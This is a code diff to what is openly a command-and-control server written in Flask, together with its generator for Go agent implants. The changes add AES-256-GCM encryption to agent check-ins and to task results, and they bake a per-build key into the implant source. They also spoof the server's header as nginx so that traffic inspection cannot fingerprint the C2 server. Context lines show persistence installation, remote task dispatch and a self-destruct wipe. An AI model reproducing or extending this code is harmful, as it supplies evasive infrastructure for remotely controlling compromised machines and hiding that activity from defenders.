@@ -1,7 +1,9 @@
 from flask import Flask, request, jsonify, render_template, send_file, Response
 from werkzeug.utils import secure_filename
 from database import get_db_connection
+from crypto import generate_key, encrypt_payload, decrypt_payload
 from datetime import datetime, timezone
+import json
 import subprocess
 import shutil
 import tempfile
@@ -10,6 +12,14 @@ import re
 import zipfile
 
 app = Flask(__name__)
+
+# Replace the default Werkzeug/Python Server header on every response.
+# Without this, the header would immediately fingerprint the C2 server
+# as a Flask application to anyone inspecting the traffic.
+@app.after_request
+def mask_server_header(response):
+    response.headers["Server"] = "nginx/1.24.0"
+    return response
 
 # Directory where compiled agent binaries are stored
 BUILDS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "builds")
@@ -45,32 +55,47 @@ def dashboard():
 def checkin():
     """
     Agent check-in endpoint.
-    Receives: { "agent_id": "...", "hostname": "...", "os": "..." }
-    Returns:  { "tasks": [ { "id": ..., "command": "..." }, ... ] }
+    Expects: { "kid": "<8-char key fingerprint>", "data": "<base64 AES-256-GCM encrypted JSON>" }
+    Inner plaintext:  { "agent_id": "...", "hostname": "...", "os": "..." }
+    Returns encrypted: { "kid": "...", "data": "<encrypted JSON>" }
+    Inner response:   { "status": "ok", "tasks": [ { "id": ..., "command": "..." }, ... ] }
     """
-    data = request.get_json()
+    envelope = request.get_json()
 
-    if not data or "agent_id" not in data:
+    # Validate envelope
+    if not envelope or "kid" not in envelope or "data" not in envelope:
+        return jsonify({"error": "Invalid envelope"}), 400
+
+    kid = envelope["kid"]
+    key_hex = _get_key_for_kid(kid)
+    if not key_hex:
+        return jsonify({"error": "Unknown key_id"}), 403
+
+    # Decrypt the inner payload
+    try:
+        raw  = decrypt_payload(key_hex, envelope["data"])
+        data = json.loads(raw)
+    except Exception:
+        return jsonify({"error": "Decryption failed"}), 403
+
+    if "agent_id" not in data:
         return jsonify({"error": "Missing agent_id"}), 400
 
-    agent_id = data["agent_id"]
-    hostname = data.get("hostname", "unknown")
-    agent_os = data.get("os", "unknown")
-    ip = request.remote_addr
+    agent_id   = data["agent_id"]
+    hostname   = data.get("hostname", "unknown")
+    agent_os   = data.get("os", "unknown")
+    ip         = request.remote_addr
 
     conn = get_db_connection()
 
-    # Check if agent already exists
     existing = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
 
     if existing:
-        # Update last_seen and info
         conn.execute(
             "UPDATE agents SET hostname = ?, ip = ?, os = ?, last_seen = ? WHERE id = ?",
             (hostname, ip, agent_os, datetime.now(timezone.utc).isoformat(), agent_id),
         )
     else:
-        # Register new agent
         conn.execute(
             "INSERT INTO agents (id, hostname, ip, os, last_seen) VALUES (?, ?, ?, ?, ?)",
             (agent_id, hostname, ip, agent_os, datetime.now(timezone.utc).isoformat()),
@@ -78,23 +103,41 @@ def checkin():
 
     conn.commit()
 
-    # Fetch pending tasks for this agent
     tasks = conn.execute(
         "SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending'",
         (agent_id,),
     ).fetchall()
 
-    # Mark fetched tasks as 'sent'
     for task in tasks:
         conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task["id"],))
 
     conn.commit()
     conn.close()
 
-    return jsonify({
+    # Encrypt the response before sending it back
+    response_body = {
         "status": "ok",
         "tasks": [{"id": t["id"], "command": t["command"]} for t in tasks],
-    })
+    }
+    enc = encrypt_payload(key_hex, json.dumps(response_body).encode())
+    return jsonify({"kid": kid, "data": enc})
+
+
+# ─────────────────────────────────────────────
+#  Crypto Helpers
+# ─────────────────────────────────────────────
+
+def _get_key_for_kid(kid: str) -> str | None:
+    """
+    Look up the AES-256 encryption key for a given key_id fingerprint.
+    Returns the 64-char hex key string, or None if the kid is not found.
+    """
+    conn = get_db_connection()
+    row = conn.execute(
+        "SELECT encryption_key FROM builds WHERE key_id = ?", (kid,)
+    ).fetchone()
+    conn.close()
+    return row["encryption_key"] if row else None
 
 
 # ─────────────────────────────────────────────
@@ -156,13 +199,30 @@ def get_tasks(agent_id):
 def submit_result():
     """
     Agent submits task result.
-    Receives: { "task_id": ..., "output": "..." }
+    Expects: { "kid": "<key fingerprint>", "data": "<encrypted JSON>" }
+    Inner plaintext: { "task_id": ..., "output": "..." }
     """
-    data = request.get_json()
+    envelope = request.get_json()
 
-    if not data or "task_id" not in data:
+    # Validate and decrypt
+    if not envelope or "kid" not in envelope or "data" not in envelope:
+        return jsonify({"error": "Invalid envelope"}), 400
+
+    kid = envelope["kid"]
+    key_hex = _get_key_for_kid(kid)
+    if not key_hex:
+        return jsonify({"error": "Unknown key_id"}), 403
+
+    try:
+        raw  = decrypt_payload(key_hex, envelope["data"])
+        data = json.loads(raw)
+    except Exception:
+        return jsonify({"error": "Decryption failed"}), 403
+
+    if "task_id" not in data:
         return jsonify({"error": "Missing task_id"}), 400
 
+    # Store result and handle self-destruct cleanup
     conn = get_db_connection()
     conn.execute(
         "INSERT INTO results (task_id, output) VALUES (?, ?)",
@@ -171,14 +231,12 @@ def submit_result():
     conn.execute("UPDATE tasks SET status = 'complete' WHERE id = ?", (data["task_id"],))
     conn.commit()
 
-    # Check if this was a self-destruct task (auto-clean the agent)
     task = conn.execute(
         "SELECT agent_id, command FROM tasks WHERE id = ?", (data["task_id"],)
     ).fetchone()
 
     if task and task["command"] == "__selfdestruct__":
         agent_id = task["agent_id"]
-        # Purge agent and all its data
         conn.execute("""
             DELETE FROM results WHERE task_id IN (
                 SELECT id FROM tasks WHERE agent_id = ?
@@ -190,7 +248,9 @@ def submit_result():
 
     conn.close()
 
-    return jsonify({"status": "ok"})
+    # Encrypt the response
+    enc = encrypt_payload(key_hex, json.dumps({"status": "ok"}).encode())
+    return jsonify({"kid": kid, "data": enc})
 
 
 @app.route("/api/results/<int:task_id>", methods=["GET"])
@@ -332,13 +392,16 @@ def _sanitize_interval(interval_str):
     return interval_str.strip()
 
 
-def _generate_config_go(server_url, jitter_min, jitter_max, persistence, profile_id=1, locale="en-US,en;q=0.9"):
+def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
+                        profile_id=1, locale="en-US,en;q=0.9",
+                        key_hex="", key_id=""):
     """Generate a config.go file with the given settings."""
 
     return f'''package main
 
 import (
 \t"crypto/rand"
+\t"encoding/hex"
 \t"fmt"
 \t"net/http"
 \t"os"
@@ -358,7 +421,21 @@ var (
 \tLocale        = "{locale}"
 \tAgentID       string
 \tEnablePersist = {str(persistence).lower()}
+
+\t// ─── Per-build AES-256-GCM Key ───
+\tKeyID         = "{key_id}"
+\tEncryptionKey = mustDecodeHex("{key_hex}")
 )
+
+// mustDecodeHex converts a compile-time hex literal to []byte.
+// Panics at startup if the key is malformed so we fail fast.
+func mustDecodeHex(s string) []byte {{
+\tb, err := hex.DecodeString(s)
+\tif err != nil {{
+\t\tpanic("c2-agent: invalid encryption key: " + err.Error())
+\t}}
+\treturn b
+}}
 
 func generateUUID() string {{
 \tb := make([]byte, 16)
@@ -393,6 +470,7 @@ func InitConfig() {{
 \tfmt.Printf("  Jitter    : %s - %s\\n", JitterMin, JitterMax)
 \tfmt.Printf("  Profile   : %s\\n", profile.Name)
 \tfmt.Printf("  Locale    : %s\\n", Locale)
+\tfmt.Printf("  Key ID    : %s\\n", KeyID)
 \tfmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)
 
 \thostname, err := os.Hostname()
@@ -411,13 +489,13 @@ def _generate_main_go(persistence):
     if persistence:
         persist_block = """
 \t// Install persistence mechanism
-\tif EnablePersist {
-\t\tif err := funcs.Persist(); err != nil {
+\tif EnablePersist {{
+\t\tif err := funcs.Persist(); err != nil {{
 \t\t\tfmt.Printf("[!] Persistence failed: %v\\n", err)
-\t\t} else {
+\t\t}} else {{
 \t\t\tfmt.Println("[+] Persistence installed successfully")
-\t\t}
-\t}
+\t\t}}
+\t}}
 """
 
     return f'''package main
@@ -462,7 +540,7 @@ func main() {{
 \thostname, _ := os.Hostname()
 \tagentOS := runtime.GOOS
 
-\tfmt.Printf("\\n[*] Starting check-in loop (jitter: %s \u2013 %s)\u2026\\n\\n", JitterMin, JitterMax)
+\tfmt.Printf("\\n[*] Starting check-in loop (jitter: %s – %s)…\\n\\n", JitterMin, JitterMax)
 
 \tfor {{
 \t\ttasks, err := checkIn(hostname, agentOS)
@@ -479,7 +557,7 @@ func main() {{
 
 \t\t\tif task.Command == "__selfdestruct__" {{
 \t\t\t\tfmt.Println("[!] Self-destruct command received from server!")
-\t\t\t\t_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping\u2026")
+\t\t\t\t_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping…")
 \t\t\t\tfuncs.SelfDestruct()
 \t\t\t}}
 
@@ -542,32 +620,28 @@ func checkIn(hostname, agentOS string) ([]Task, error) {{
 \t\tOS:       agentOS,
 \t}}
 
-\tbody, err := json.Marshal(payload)
+\trespBody, err := encryptedPost(ServerURL+"/api/checkin", payload)
 \tif err != nil {{
-\t\treturn nil, fmt.Errorf("marshal error: %w", err)
+\t\treturn nil, err
 \t}}
 
-\tresp, err := http.Post(
-\t\tServerURL+"/api/checkin",
-\t\t"application/json",
-\t\tbytes.NewBuffer(body),
-\t)
-\tif err != nil {{
-\t\treturn nil, fmt.Errorf("request error: %w", err)
+\t// Server responds with the same {{"kid":...,"data":...}} envelope.
+\tvar envelope struct {{
+\t\tData string `json:"data"`
 \t}}
-\tdefer resp.Body.Close()
+\tif err := json.Unmarshal(respBody, &envelope); err != nil {{
+\t\treturn nil, fmt.Errorf("envelope unmarshal: %w", err)
+\t}}
 
-\trespBody, err := io.ReadAll(resp.Body)
+\tplain, err := funcs.Decrypt(EncryptionKey, envelope.Data)
 \tif err != nil {{
-\t\treturn nil, fmt.Errorf("read error: %w", err)
+\t\treturn nil, fmt.Errorf("decrypt checkin response: %w", err)
 \t}}
 
 \tvar result CheckInResponse
-\terr = json.Unmarshal(respBody, &result)
-\tif err != nil {{
-\t\treturn nil, fmt.Errorf("unmarshal error: %w", err)
+\tif err := json.Unmarshal(plain, &result); err != nil {{
+\t\treturn nil, fmt.Errorf("unmarshal response: %w", err)
 \t}}
-
 \treturn result.Tasks, nil
 }}
 
@@ -576,23 +650,36 @@ func sendResult(taskID int, output string) error {{
 \t\tTaskID: taskID,
 \t\tOutput: output,
 \t}}
+\t_, err := encryptedPost(ServerURL+"/api/result", payload)
+\treturn err
+}}
 
-\tbody, err := json.Marshal(payload)
+// encryptedPost marshals payload to JSON, encrypts it with AES-256-GCM,
+// wraps it in {{"kid":...,"data":...}} envelope, and POSTs to url.
+// Returns the raw response body for the caller to decrypt if needed.
+func encryptedPost(url string, payload any) ([]byte, error) {{
+\tinner, err := json.Marshal(payload)
 \tif err != nil {{
-\t\treturn fmt.Errorf("marshal error: %w", err)
+\t\treturn nil, fmt.Errorf("marshal: %w", err)
 \t}}
 
-\tresp, err := http.Post(
-\t\tServerURL+"/api/result",
-\t\t"application/json",
-\t\tbytes.NewBuffer(body),
-\t)
+\tenc, err := funcs.Encrypt(EncryptionKey, inner)
 \tif err != nil {{
-\t\treturn fmt.Errorf("request error: %w", err)
+\t\treturn nil, fmt.Errorf("encrypt: %w", err)
+\t}}
+
+\tenvelope := map[string]string{{"kid": KeyID, "data": enc}}
+\tbody, err := json.Marshal(envelope)
+\tif err != nil {{
+\t\treturn nil, fmt.Errorf("envelope marshal: %w", err)
+\t}}
+
+\tresp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
+\tif err != nil {{
+\t\treturn nil, fmt.Errorf("post: %w", err)
 \t}}
 \tdefer resp.Body.Close()
-
-\treturn nil
+\treturn io.ReadAll(resp.Body)
 }}
 '''
 
@@ -678,8 +765,14 @@ def build_agent():
         tmp_agent = os.path.join(tmp_dir, "agent")
         shutil.copytree(agent_src, tmp_agent)
 
+        # Generate key for this build
+        key_hex, key_id = generate_key()
+
         # Generate custom config.go
-        config_content = _generate_config_go(server_url, jitter_min, jitter_max, persistence, profile_id, locale)
+        config_content = _generate_config_go(
+            server_url, jitter_min, jitter_max, persistence, profile_id, locale,
+            key_hex=key_hex, key_id=key_id
+        )
         with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
             f.write(config_content)
 
@@ -691,7 +784,7 @@ def build_agent():
         # Build the binary
         output_path = os.path.join(tmp_dir, filename)
         env = os.environ.copy()
-        env["GOOS"] = target_os
+        env["GOOS"] = "darwin" if target_os == "mac" else target_os
         env["GOARCH"] = arch
         env["CGO_ENABLED"] = "0"
         
@@ -731,8 +824,8 @@ def build_agent():
         # Record in database
         conn = get_db_connection()
         cursor = conn.execute(
-            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", 1 if persistence else 0, final_path, file_size),
+            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", 1 if persistence else 0, final_path, file_size, key_id, key_hex),
         )
         build_id = cursor.lastrowid
         conn.commit()
@@ -1016,4 +1109,13 @@ def delete_staged_file(file_id):
 # ─────────────────────────────────────────────
 
 if __name__ == "__main__":
+    # Patch Werkzeug's transport-level Server header before starting.
+    # Flask's @after_request hook only controls the response object, but
+    # Werkzeug's dev server writes its own Server line directly to the socket
+    # before that hook runs. Without this patch both headers appear in the
+    # response, which is worse than one because it reveals the masking attempt.
+    from werkzeug.serving import WSGIRequestHandler
+    WSGIRequestHandler.server_version = "nginx/1.24.0"
+    WSGIRequestHandler.sys_version = ""
+
     app.run(host="0.0.0.0", port=5000, debug=True)
